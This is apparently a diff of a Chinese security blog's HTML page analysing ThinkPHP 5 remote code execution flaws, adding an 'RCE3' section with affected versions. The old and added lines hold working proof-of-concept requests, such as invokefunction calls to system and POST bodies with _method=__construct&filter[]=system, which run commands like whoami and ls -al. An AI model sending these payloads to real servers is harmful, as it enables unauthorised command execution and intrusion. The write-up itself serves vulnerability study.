@@ -48,7 +48,7 @@
 <meta property="og:image" content="https://github.com/Mochazz/ThinkPHP-Vuln/raw/master/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C9/8.png">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923224451.png">
 <meta property="article:published_time" content="2020-09-23T03:04:09.000Z">
-<meta property="article:modified_time" content="2020-09-24T07:34:06.688Z">
+<meta property="article:modified_time" content="2020-09-27T13:39:21.764Z">
 <meta property="article:author" content="m0nk3y">
 <meta property="article:tag" content="代码审计">
 <meta property="article:tag" content="RCE">
@@ -310,7 +310,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count word-count">3.2k</span>Reading time: <span class="post-count reading-time">14 min</span></span>
+                        <span>Word count: <span class="post-count word-count">3.4k</span>Reading time: <span class="post-count reading-time">15 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -514,10 +514,6 @@ height:50vh;
 <p><strong>5.0.x</strong> ：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?s&#x3D;index&#x2F;think\config&#x2F;get&amp;name&#x3D;database.username # 获取配置信息</span><br><span class="line">?s&#x3D;index&#x2F;\think\Lang&#x2F;load&amp;file&#x3D;..&#x2F;..&#x2F;test.jpg    # 包含任意文件</span><br><span class="line">?s&#x3D;index&#x2F;\think\Config&#x2F;load&amp;file&#x3D;..&#x2F;..&#x2F;t.php     # 包含任意.php文件</span><br><span class="line">?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br></pre></td></tr></table></figure>
 
-
-
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
 <p>这里以以这个POC进行分析，ThinkPHP 版本为<code>5.1.30</code> </p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;public&#x2F;index.php?s&#x3D;index&#x2F;\think\Container&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;phpinfo&amp;vars[1][]&#x3D;1</span><br></pre></td></tr></table></figure>
 
@@ -584,7 +580,12 @@ height:50vh;
 </blockquote>
 <p>官方的修复方法是：增加正则表达式 <code>^[A-Za-z](\w)*$</code> ，对控制器名进行合法性检测。</p>
 <p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923224451.png" alt="image-20200923224445456"></p>
-<h1 id="RCE3"><a href="#RCE3" class="headerlink" title="RCE3"></a>RCE3</h1><h2 id="POC-2"><a href="#POC-2" class="headerlink" title="POC"></a>POC</h2><h2 id="漏洞概述-2"><a href="#漏洞概述-2" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><h2 id="影响版本-2"><a href="#影响版本-2" class="headerlink" title="影响版本"></a>影响版本</h2><h2 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h2 id="利用总结-2"><a href="#利用总结-2" class="headerlink" title="利用总结"></a>利用总结</h2><h2 id="漏洞修复-2"><a href="#漏洞修复-2" class="headerlink" title="漏洞修复"></a>漏洞修复</h2>
+<h1 id="RCE3"><a href="#RCE3" class="headerlink" title="RCE3"></a>RCE3</h1><h2 id="POC-2"><a href="#POC-2" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># ThinkPHP &lt;&#x3D; 5.0.13</span><br><span class="line">POST &#x2F;?s&#x3D;index&#x2F;index</span><br><span class="line">s&#x3D;whoami&amp;_method&#x3D;__construct&amp;method&#x3D;&amp;filter[]&#x3D;system</span><br><span class="line"></span><br><span class="line"># ThinkPHP &lt;&#x3D; 5.0.23、5.1.0 &lt;&#x3D; 5.1.16 需要开启框架app_debug</span><br><span class="line">POST &#x2F;</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;server[REQUEST_METHOD]&#x3D;ls -al</span><br><span class="line"></span><br><span class="line"># ThinkPHP &lt;&#x3D; 5.0.23 需要存在xxx的method路由，例如captcha</span><br><span class="line">POST &#x2F;?s&#x3D;xxx HTTP&#x2F;1.1</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;get[]&#x3D;ls+-al</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;ls</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞概述-2"><a href="#漏洞概述-2" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>和上一个RCE直接原因一样，都是没有对控制器进行很好的合法性校验。</p>
+<p>漏洞存在于 <strong>ThinkPHP</strong> 底层没有对控制器名进行很好的合法性校验，导致在未开启强制路由的情况下，用户可以调用任意类的任意方法，最终导致 <strong>远程代码执行漏洞</strong> 的产生。</p>
+<h2 id="影响版本-2"><a href="#影响版本-2" class="headerlink" title="影响版本"></a>影响版本</h2><p><strong>5.0.0&lt;=ThinkPHP5&lt;=5.0.23</strong> 、<strong>5.1.0&lt;=ThinkPHP&lt;=5.1.30</strong></p>
+<h2 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h2 id="利用总结-2"><a href="#利用总结-2" class="headerlink" title="利用总结"></a>利用总结</h2><h2 id="漏洞修复-2"><a href="#漏洞修复-2" class="headerlink" title="漏洞修复"></a>漏洞修复</h2>
     </article>
     <!-- license  -->
     
@@ -592,7 +593,7 @@ height:50vh;
             <p>Author：<a href="https://hack-for.fun">m0nk3y</a>
             <p>原文链接：<a href="https://hack-for.fun/a45.html">https://hack-for.fun/a45.html</a>
             <p>发表日期：<a href="https://hack-for.fun/a45.html">September 23rd 2020, 11:04:09 am</a>
-            <p>更新日期：<a href="https://hack-for.fun/a45.html">September 24th 2020, 3:34:06 pm</a>
+            <p>更新日期：<a href="https://hack-for.fun/a45.html">September 27th 2020, 9:39:21 pm</a>
             <p>版权声明：<b>原创文章转载时请注明出处</b></p>
         </div>
     
@@ -1000,8 +1001,6 @@ top:50vh;
     
     
     
-    
-    
     <div class="total-and-search">
         <div class="total-archive">
         Total : 22
@@ -1139,27 +1138,27 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="SSTI"><span class="iconfont-archer">&#xe606;</span>SSTI</span>
     
-        <span class="sidebar-tag-name" data-tags="代码审计"><span class="iconfont-archer">&#xe606;</span>代码审计</span>
+        <span class="sidebar-tag-name" data-tags="协议层安全"><span class="iconfont-archer">&#xe606;</span>协议层安全</span>
     
         <span class="sidebar-tag-name" data-tags="PHP安全"><span class="iconfont-archer">&#xe606;</span>PHP安全</span>
     
-        <span class="sidebar-tag-name" data-tags="协议层安全"><span class="iconfont-archer">&#xe606;</span>协议层安全</span>
-    
-        <span class="sidebar-tag-name" data-tags="Linux应急响应"><span class="iconfont-archer">&#xe606;</span>Linux应急响应</span>
+        <span class="sidebar-tag-name" data-tags="代码审计"><span class="iconfont-archer">&#xe606;</span>代码审计</span>
     
         <span class="sidebar-tag-name" data-tags="文件包含"><span class="iconfont-archer">&#xe606;</span>文件包含</span>
+    
+        <span class="sidebar-tag-name" data-tags="Linux应急响应"><span class="iconfont-archer">&#xe606;</span>Linux应急响应</span>
     
         <span class="sidebar-tag-name" data-tags="端口"><span class="iconfont-archer">&#xe606;</span>端口</span>
     
         <span class="sidebar-tag-name" data-tags="漏洞挖掘"><span class="iconfont-archer">&#xe606;</span>漏洞挖掘</span>
     
-        <span class="sidebar-tag-name" data-tags="RCE"><span class="iconfont-archer">&#xe606;</span>RCE</span>
-    
         <span class="sidebar-tag-name" data-tags="SQL注入"><span class="iconfont-archer">&#xe606;</span>SQL注入</span>
+    
+        <span class="sidebar-tag-name" data-tags="iptables"><span class="iconfont-archer">&#xe606;</span>iptables</span>
     
         <span class="sidebar-tag-name" data-tags="APT"><span class="iconfont-archer">&#xe606;</span>APT</span>
     
-        <span class="sidebar-tag-name" data-tags="iptables"><span class="iconfont-archer">&#xe606;</span>iptables</span>
+        <span class="sidebar-tag-name" data-tags="RCE"><span class="iconfont-archer">&#xe606;</span>RCE</span>
     
         <span class="sidebar-tag-name" data-tags="Redis"><span class="iconfont-archer">&#xe606;</span>Redis</span>
     
